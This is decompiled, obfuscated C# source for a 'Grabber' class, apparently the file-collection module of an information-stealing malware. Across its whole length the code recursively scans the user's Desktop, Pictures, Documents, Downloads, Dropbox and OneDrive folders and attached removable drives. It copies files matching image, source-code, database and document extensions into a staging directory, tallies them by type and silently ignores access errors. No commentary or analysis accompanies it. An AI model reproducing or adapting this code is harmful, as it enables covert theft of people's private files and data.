using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using ns13;
using ns2;

namespace ns5;

internal sealed class Class19
{
	[CompilerGenerated]
	private sealed class Class20
	{
		public string string_0;

		internal void _003CRun_003Eb__0()
		{
			smethod_3(string_0);
		}
	}

	private static string string_0 = "Grabber";

	private static List<string> list_0 = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
	};

	private static string smethod_0(string string_1)
	{
		switch (string_1)
		{
		case "Image":
			Class54.int_15++;
			break;
		case "SourceCode":
			Class54.int_13++;
			break;
		case "DataBase":
			Class54.int_14++;
			break;
		case "Document":
			Class54.int_12++;
			break;
		}
		return string_1;
	}

	private static string smethod_1(string string_1)
	{
		string text = string_1.Replace(".", "").ToLower();
		foreach (KeyValuePair<string, string[]> item in Class8.dictionary_1)
		{
			string[] value = item.Value;
			foreach (string value2 in value)
			{
				if (text.Equals(value2))
				{
					return smethod_0(item.Key);
				}
			}
		}
		return null;
	}

	private static void smethod_2(string string_1)
	{
		FileInfo fileInfo = new FileInfo(string_1);
		if (fileInfo.Length <= Class8.int_0 && smethod_1(fileInfo.Extension) != null)
		{
			string text = Path.Combine(string_0, Path.GetDirectoryName(string_1)!.Replace(Path.GetPathRoot(string_1), "DRIVE-" + Path.GetPathRoot(string_1)!.Replace(":", "")));
			string destFileName = Path.Combine(text, fileInfo.Name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			fileInfo.CopyTo(destFileName, overwrite: true);
		}
	}

	private static void smethod_3(string string_1)
	{
		if (!Directory.Exists(string_1))
		{
			return;
		}
		string[] directories;
		string[] files;
		try
		{
			directories = Directory.GetDirectories(string_1);
			files = Directory.GetFiles(string_1);
		}
		catch (UnauthorizedAccessException)
		{
			return;
		}
		catch (AccessViolationException)
		{
			return;
		}
		string[] array = files;
		for (int i = 0; i < array.Length; i++)
		{
			smethod_2(array[i]);
		}
		array = directories;
		foreach (string string_2 in array)
		{
			try
			{
				smethod_3(string_2);
			}
			catch
			{
			}
		}
	}

	public static void smethod_4(string string_1)
	{
		try
		{
			string_0 = string_1;
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					list_0.Add(driveInfo.RootDirectory.FullName);
				}
			}
			if (!Directory.Exists(string_0))
			{
				Directory.CreateDirectory(string_0);
			}
			List<Thread> list = new List<Thread>();
			foreach (string string_2 in list_0)
			{
				try
				{
					list.Add(new Thread((ThreadStart)delegate
					{
						smethod_3(string_2);
					}));
				}
				catch
				{
				}
			}
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				if (item2.IsAlive)
				{
					item2.Join();
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
